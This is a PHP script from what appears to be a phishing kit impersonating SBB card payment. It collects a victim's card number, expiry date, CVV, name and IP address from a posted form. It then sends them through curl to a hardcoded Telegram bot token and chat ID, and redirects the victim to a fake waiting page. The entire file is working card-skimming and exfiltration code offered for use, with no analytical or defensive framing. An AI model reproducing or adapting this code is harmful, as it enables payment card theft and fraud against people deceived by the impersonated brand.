<?php
$cc = $_POST['cardno'] ; 
$exp = $_POST['expiry'] ; 
$cvv = $_POST['cvv'] ; 
$first = $_POST['uppCustomerFirstName'] ; 
$last = $_POST['uppCustomerLastName'] ; 

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 

 
$subject = "SBB CARD  | CH :   :) <3 : from: ".$ip;
$nome="SBB CARD " ; 
	$from="frt@huzrt.com" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message  = "------------------+ 🙏🏽  SBB - CARD 🙏🏽 +-----------------\r\n";
$message .= "CC NUM : ".$cc."\r\n";
$message .= "EXP : " .$exp."\r\n";
$message .= "CVV : " .$cvv."\r\n";
$message .= "Prénom : " .$first."\r\n";
$message .= "Nom : " .$last."\r\n";
$message .= "---------------+ 🌏 SZNN$$ 🌏 +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ ⚡️ ⚡️⚡️ ⚡️  +------------------\r\n";



 	$website="https://api.telegram.org/bot5576566323:AAF8mXo0jDvQylxyxmUZwA67wP_G-DqGCLo";
    $params=[
        'chat_id'=>'2142292088',
        'text'=>$message,
    ];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch); 


   $x=md5(microtime());$xx=sha1(microtime());


echo "<script> window.top.location.href = '../wait/index.html?cmd=_sbb&session=".$x.$xx."';   </script>";

?>